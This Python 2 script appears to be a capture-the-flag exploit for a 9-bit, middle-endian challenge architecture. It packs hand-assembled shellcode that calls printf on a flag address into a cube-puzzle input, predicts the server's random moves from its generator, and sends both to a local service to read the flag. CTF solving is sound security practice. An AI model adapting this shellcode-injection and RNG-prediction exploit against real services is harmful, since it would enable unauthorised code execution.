import socket

class Connection(object):
    def __init__(self, ip, port):
        self.sock = socket.create_connection((ip, port))
        self.bitstream = ''
        self.count = 0

    def recv_1_byte(self):
        while len(self.bitstream) < 9:
            self.count += 1
            x = self.sock.recv(1)
            #print "{0:3} : {1:02x} {1:08b}".format(self.count,ord(x))
            if len(x) == 0: raise socket.timeout
            self.bitstream += '{:08b}'.format(ord(x))
        x = int(self.bitstream[:9], 2)
        self.bitstream = self.bitstream[9:]
        return x

    def reset_stream(self):
        if '1' in self.bitstream:
            print 'found non-zero bit in reset_stream'
        self.bitstream = ''

    def send(self, x):
        s = ''
        for c in x: s += '{:09b}'.format(c)
        if len(s) % 8 != 0: s += '0' * (8 - len(s) % 8)
        s2 = ''
        for i in range(0, len(s), 8): s2 += chr(int(s[i:i+8], 2))
        self.sock.send(s2)

    def sendstr(self, x):
        self.send(map(ord, x))

    def recvstruntil(self, y):
        s = ''
        while True:
            x = chr(self.recv_1_byte() & 0xff)
            s += x
            if y in s: break
        self.reset_stream()
        return s

# handle middle endian
def endian(x):
    if len(x) == 18:
        return x[9:18] + x[:9]
    elif len(x) == 27:
        return x[9:18] + x[:9] + x[18:27]
    else:
        return x[9:18] + x[:9] + x[18:27] + x[36:45] + x[27:36] + x[45:54]

# `printf(flag)` assembly
flag_addr = 0x4010000
printf_addr = 0x4D7B
#fflush_addr = 0x430D
jedi_addr = 0x9940
inst = endian('10010' + "{:05b}".format(0) + "{:017b}".format(flag_addr & ((1 << 10)-1))) # ml R00 flag_addr
inst += endian('10001' + "{:05b}".format(0) + "{:017b}".format(flag_addr >> 10)) # mh R00 flag_addr
inst += endian('10010' + "{:05b}".format(19) + "{:017b}".format(printf_addr)) # ml R19 printf_addr
inst += endian('110111' + "1111" + "{:05b}".format(19) + "000") # cr R19
#inst += endian('10010' + "{:05b}".format(0) + "{:017b}".format(jedi_addr)) # ml R00 jedi_addr
#inst += endian('10010' + "{:05b}".format(19) + "{:017b}".format(fflush_addr)) # ml R19 fflush_addr
#inst += endian('110111' + "1111" + "{:05b}".format(19) + "000") # cr R19
inst = "{:0<486}".format(inst)

payload = []
ans = []
direction = ["U'", "U", "D'", "D", "L'", "L", "R'", "R", "F'", "F", "B'", "B"]
seed = int(inst[9:18] + inst[:9] + inst[18:27],2)

# transform instruction to payload
for i in xrange(54):
    payload.append(int(inst[(i+0)*9:(i+1)*9],2))
payload = ','.join([str(word) for word in payload])

def rand():
    global seed
    seed = (seed * 0x62B846D + 0x3039) & 0x7ffffff
    return seed

# get answer
for i in xrange(30):
    x = rand() % 12
    ans.append(direction[x])
ans.reverse()

# send payload
c = Connection('127.0.0.1',5000)
print c.recvstruntil('\n')
print c.recvstruntil('): ')
c.sendstr(payload + '\n')

# send answer
for i in xrange(15): print c.recvstruntil('\n')
for action in ans:
    print c.recvstruntil('): ')
    c.sendstr(action + '\n')
    for i in xrange(15): print c.recvstruntil('\n')

# retrive flag
print c.recvstruntil('\n')
print c.recvstruntil('\n')
